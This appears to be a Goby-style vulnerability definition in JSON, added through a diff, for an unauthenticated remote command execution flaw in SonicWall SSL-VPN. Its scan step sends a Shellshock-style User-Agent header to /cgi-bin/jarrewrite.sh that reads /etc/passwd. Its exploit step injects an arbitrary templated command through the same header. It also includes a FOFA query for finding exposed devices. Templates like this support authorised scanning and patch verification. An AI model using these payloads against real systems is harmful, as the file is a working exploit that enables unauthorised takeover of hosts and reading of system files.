@@ -1,0 +1,90 @@
+{
+  "Name": "SonicWall SSL-VPN Unauthorized RCE",
+  "Description": "There are vulnerabilities in the historical version of SonicWall SSL-VPN. Remote attackers use CGI programs to handle logic vulnerabilities and construct malicious User-Agents, which can cause remote arbitrary command execution and gain host control authority.",
+  "Product": "SonicWALL-SSL-VPN",
+  "Homepage": "https://www.sonicwall.com/",
+  "DisclosureDate": "2021-01-26",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"SonicWALL-SSL-VPN\"",
+  "GobyQuery": "app=\"SonicWALL-SSL-VPN\"",
+  "Level": "3",
+  "Impact": "Which can cause remote arbitrary command execution and gain host control authority.",
+  "GifAddress": " https://raw.githubusercontent.com/gobysec/GobyVuls/master/SonicWall/SonicWall_SSL-VPN_RCE/SonicWall_SSL-VPN_RCE.gif",
+  "Recommendation": "Upgrade.",
+  "References": [
+    "https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "header": {"User-Agent": "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"},
+        "uri": "/cgi-bin/jarrewrite.sh"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "root:",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "header": {"User-Agent": "() { :; }; echo ; /bin/bash -c '{{{cmd}}}'"},
+        "uri": "/cgi-bin/jarrewrite.sh"
+      },
+      "SetVariable": [
+        "output|lastbody",
+        "output|output|removeline|-1",
+        "output|output|removeline|-1"
+      ]
+    }
+  ],
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": "9.3",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["SonicWALL-SSL-VPN"]
+  }
+}
